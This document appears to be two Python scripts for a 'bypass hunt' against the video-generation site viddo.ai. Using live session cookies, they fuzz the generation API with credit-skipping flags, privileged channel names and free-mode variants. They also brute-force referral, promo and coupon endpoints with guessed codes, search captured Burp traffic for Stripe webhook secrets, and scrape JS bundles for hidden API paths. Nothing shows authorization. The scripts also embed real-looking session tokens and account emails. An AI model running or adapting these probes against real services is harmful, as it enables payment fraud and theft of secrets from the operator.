"""
Bypass hunt round 3 - viddo.ai
1. skipCredits value probe
2. channel param probe
3. Referral/reward/credit grant endpoints
"""
import requests, json, time

SESSION_TOKEN = 'uVrw1NqmIvzEcGBdHduaJwAzTySq55TN.inTUrq0EHJ%2F24cDxQXOvikggOi2Zk2AX9Olom2%2Brhqs%3D'
SESSION_DATA  = 'eyJzZXNzaW9uIjp7InNlc3Npb24iOnsiZXhwaXJlc0F0IjoiMjAyNi0wNS0wNVQwODozMjozNi40OTFaIiwidG9rZW4iOiJ1VnJ3MU5xbUl2ekVjR0JkSGR1YUp3QXpUeVNxNTVUTiIsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjhUMDg6MzI6MzYuNDkxWiIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjhUMDg6MzI6MzYuNDkxWiIsImlwQWRkcmVzcyI6IjExMS45My4xMi4xNDIiLCJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxNTIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xNTIuMCIsInVzZXJJZCI6ImhtWDdDVHhMZEFYWWxJMElhdUxhTFJWRGhrbUxNTFJtIiwiaWQiOiJQMUR6cVROQ1ZVeklOZ2Y5eEVDZnJtQm1mTk5NeWVwTSJ9LCJ1c2VyIjp7Im5hbWUiOiJuZmoxM0BlZHUtbWFpbC5lZHUucnMiLCJlbWFpbCI6Im5majEzQGVkdS1tYWlsLmVkdS5ycyIsImVtYWlsVmVyaWZpZWQiOnRydWUsImltYWdlIjpudWxsLCJjcmVhdGVkQXQiOiIyMDI2LTA0LTA4VDAzOjM4OjE1LjE1MVoiLCJ1cGRhdGVkQXQiOiIyMDI2LTA0LTA4VDAzOjM4OjE1LjE1MVoiLCJpZCI6ImhtWDdDVHhMZEFYWWxJMElhdUxhTFJWRGhrbUxNTFJtIn0sInVwZGF0ZWRBdCI6MTc3NzM2NTE1Njc0MSwidmVyc2lvbiI6IjEifSwiZXhwaXJlc0F0IjoxNzc3MzY1NDU2NzQxLCJzaWduYXR1cmUiOiJpRzIwRUl2cU5QbVhlTWg3bkhWT2lUUE5LNzNCUXNmbmp1Z09NTFVZcEE4In0'

COOKIES = {'__Secure-better-auth.session_token': SESSION_TOKEN, '__Secure-better-auth.session_data': SESSION_DATA}
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0', 'Content-Type': 'application/json', 'Referer': 'https://viddo.ai/', 'Origin': 'https://viddo.ai'}

def req(method, path, **kw):
    return requests.request(method, 'https://viddo.ai' + path, headers=HEADERS, cookies=COOKIES, timeout=20, **kw)

BASE = {'model': 'grok-imagine', 'channel': 'version2', 'prompt': 'a red circle', 'aspectRatio': '1:1', 'quality': '480p', 'duration': 1, 'webSearch': False, 'freeMode': True}

def probe(label, body):
    r = req('POST', '/api/middle-layer', json=body)
    try:
        d = r.json()
        hint = ('SUCCESS '+str(d)[:80]) if r.status_code < 300 else (f'{r.status_code} '+str(d)[:80])
    except Exception:
        hint = f'{r.status_code} non-json'
    print(f'  [{label}]: {hint}')

print('=== skipCredits value probe ===')
for val in [0, 1, False, 'true', 'false', 'skip', 'all', 'yes']:
    probe(f'skipCredits={val!r}', {**BASE, 'skipCredits': val})

print('\n=== channel value probe ===')
for ch in ['version1', 'admin', 'internal', 'free', 'test', 'beta', 'dev']:
    probe(f'channel={ch!r}', {**BASE, 'channel': ch})

print('\n=== Referral / reward / credit endpoints ===')
UID = 'hmX7CTxLdAXYlI0IauLaLRVDhkmLMLRm'
for ep, meth, body in [
    ('/api/referral', 'POST', {'referralCode': 'FREE'}),
    ('/api/referral/use', 'POST', {'code': 'viddo2024'}),
    ('/api/referral/code', 'GET', None),
    ('/api/invite', 'POST', {'email': 'test@test.com'}),
    ('/api/reward', 'POST', {'action': 'signup'}),
    ('/api/reward', 'GET', None),
    ('/api/reward/claim', 'POST', {'type': 'daily'}),
    ('/api/daily-reward', 'POST', {}),
    ('/api/task/complete', 'POST', {'taskId': 'daily_login'}),
    ('/api/onboarding/complete', 'POST', {'step': 'all'}),
    ('/api/promo', 'POST', {'code': 'UNLIMITED2026'}),
    ('/api/promo', 'POST', {'code': 'LAUNCH'}),
    ('/api/promo', 'POST', {'code': 'VIDDO100'}),
    ('/api/coupon/redeem', 'POST', {'code': 'FREE100'}),
]:
    if body is None:
        r = req(meth, ep)
    else:
        r = req(meth, ep, json=body)
    if r.status_code not in (404, 405) and not r.text.startswith('<!'):
        print(f'  {meth} {ep}: {r.status_code} {r.text[:150]}')
    else:
        print(f'  {meth} {ep}: {r.status_code}')
import requests, json, re, base64

BASE = 'https://viddo.ai'
SESSION_TOKEN = 'CiqAykZneKhsNT1S6iRNR75QS6Cj2n2X.g4pzFoA9Mql5aDBC3K+UuqgVTxeoOndb+eTAmGk1GKc='
SESSION_DATA = ('eyJzZXNzaW9uIjp7InNlc3Npb24iOnsiZXhwaXJlc0F0IjoiMjAyNi0wNS0wNVQwNjozNzo1OC41MjRaIiwidG9rZW4iOiJDaXFBeWtabmVLaHNOVDFTNmlSTlI3NVFTNkNqMm4yWCIsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsImlwQWRkcmVzcyI6IjExMS45My4xMi4xNDIiLCJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxNTIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xNTIuMCIsInVzZXJJZCI6InNYWFZXQUthbWlJQjdlN001WDgzZG5TclRtcFJ1UXo4IiwiaWQiOiJTOVRQVFN4TWFFdUhKQTNmUzRURmJubHdDZmE3WW1hcyJ9LCJ1c2VyIjp7Im5hbWUiOiJhaHk0OEB0ZW1wZWR1bWFpbC5tZSIsImVtYWlsIjoiYWh5NDhAdGVtcGVkdW1haWwubWUiLCJlbWFpbFZlcmlmaWVkIjp0cnVlLCJpbWFnZSI6bnVsbCwiY3JlYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwidXBkYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwiaWQiOiJzWFhWV0FLYW1pSUI3ZTdNNVg4M2RuU3JUbXBSdVF6OCJ9LCJ1cGRhdGVkQXQiOjE3NzczNTg2MTExMzMsInZlcnNpb24iOiIxIn0sImV4cGlyZXNBdCI6MTc3NzM1ODkxMTEzMywic2lnbmF0dXJlIjoidy1vU3BkNG1UTXhMUl9wNHFNc3FVTVhWbkEzc2R5N1lteWNFb3BsT0VzdyJ9')
COOKIES = {'__Secure-better-auth.session_token': SESSION_TOKEN, '__Secure-better-auth.session_data': SESSION_DATA}
H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0',
    'Accept': '*/*', 'Content-Type': 'application/json',
    'Referer': 'https://viddo.ai/dashboard', 'Origin': 'https://viddo.ai',
    'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
}

BASE_BODY = {
    'model': 'seedance-2-0', 'channel': 'version2',
    'prompt': 'a wolf running through a snowy forest, cinematic slow motion',
    'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False,
}

def gen(url, body, label, headers=None):
    h = {**H, **(headers or {})}
    r = requests.post(url, headers=h, cookies=COOKIES, json=body, timeout=15)
    code = r.status_code
    text = r.text[:200]
    print(f'  [{label}] {code}: {text}')
    return code, r.text

# ── A. freeMode placement variants ──
print('=== A. freeMode placement ===')
gen(BASE + '/api/middle-layer?freeMode=true', BASE_BODY, 'queryParam')
gen(BASE + '/api/middle-layer?free=true', BASE_BODY, 'queryParam-free')
gen(BASE + '/api/middle-layer?bypass=1', BASE_BODY, 'queryParam-bypass')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'options': {'freeMode': True}}, 'nested-options')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'config': {'freeMode': True}}, 'nested-config')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'settings': {'freeMode': True}}, 'nested-settings')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'meta': {'freeMode': True}}, 'nested-meta')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'params': {'freeMode': True}}, 'nested-params')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'FreeMode': True}, 'FreeMode-caps')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'FREEMODE': True}, 'FREEMODE-allcaps')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'free_mode': True}, 'free_mode-underscore')
gen(BASE + '/api/middle-layer', {**BASE_BODY, 'freemode': True}, 'freemode-nospace')
gen(BASE + '/api/middle-layer', BASE_BODY, 'X-Free-Mode header', headers={'X-Free-Mode': 'true'})
gen(BASE + '/api/middle-layer', BASE_BODY, 'X-freeMode header', headers={'X-freeMode': 'true'})

# ── B. Look in Burp XML for any captured Stripe webhook signatures ──
print('\n=== B. Searching Burp XML for webhook signatures ===')
print('Loading viddo.io... (229MB)')
with open('viddo.io', 'rb') as f:
    raw = f.read()

text = raw.decode('utf-8', errors='replace')

# Find Stripe-Signature headers in captured traffic
stripe_sigs = re.findall(r'Stripe-Signature[:\s]+([^\r\n<]+)', text)
print(f'Stripe-Signature occurrences: {len(stripe_sigs)}')
for s in stripe_sigs[:3]:
    print(f'  {s[:200]}')

# Find webhook secret patterns (whsec_...)
secrets = re.findall(r'whsec_[A-Za-z0-9+/=]{10,}', text)
print(f'whsec_ secrets found: {len(secrets)}')
for s in set(secrets):
    print(f'  {s}')

# Find any webhook event bodies in responses
webhook_bodies = re.findall(r'"type"\s*:\s*"(?:customer|invoice|payment|subscription)[^"]*"', text)
unique_wb = list(set(webhook_bodies))[:10]
print(f'Webhook event types found: {len(unique_wb)}')
for w in unique_wb:
    print(f'  {w}')

# ── C. Find coupon API ──
print('\n=== C. Coupon API discovery ===')
# The /api/coupon returned HTML (Next.js page) — search for real API path
coupon_paths = [
    '/api/coupon/use', '/api/coupon/apply', '/api/coupon/validate',
    '/api/coupon/redeem', '/api/coupons', '/api/coupons/redeem',
    '/api/promo/apply', '/api/promo/use',
    '/api/voucher', '/api/voucher/redeem',
    '/api/discount', '/api/discount/apply',
    '/api/gift', '/api/gift/redeem',
]
for path in coupon_paths:
    r = requests.post(BASE + path, headers=H, cookies=COOKIES, json={'code': 'UNLIMITED'}, timeout=8)
    if r.status_code not in (404, 405):
        print(f'  {path}: {r.status_code}: {r.text[:200]}')

# ── D. Scan JS bundle for coupon API path ──
print('\n=== D. Scanning JS for coupon API paths ===')
r_home = requests.get(BASE, headers={**H, 'Accept': 'text/html'}, timeout=10)
chunks = list(set(re.findall(r'/_next/static/[^\s"\']+\.js', r_home.text)))
for chunk in chunks:
    try:
        rc = requests.get(BASE + chunk, headers=H, timeout=15)
        content = rc.text
        if 'coupon' in content.lower() and '/api/' in content:
            # Extract API paths near coupon
            hits = re.findall(r'["\'](/api/[^"\']{3,60}coupon[^"\']{0,60})["\']', content, re.I)
            hits2 = re.findall(r'["\'](/api/[^"\']{3,60})["\']', content[max(0, content.lower().index('coupon')-500):content.lower().index('coupon')+500])
            if hits or hits2:
                print(f'\n  chunk: {chunk}')
                for h2 in set(hits + hits2):
                    print(f'    {h2}')
    except:
        pass

print('\nDone.')
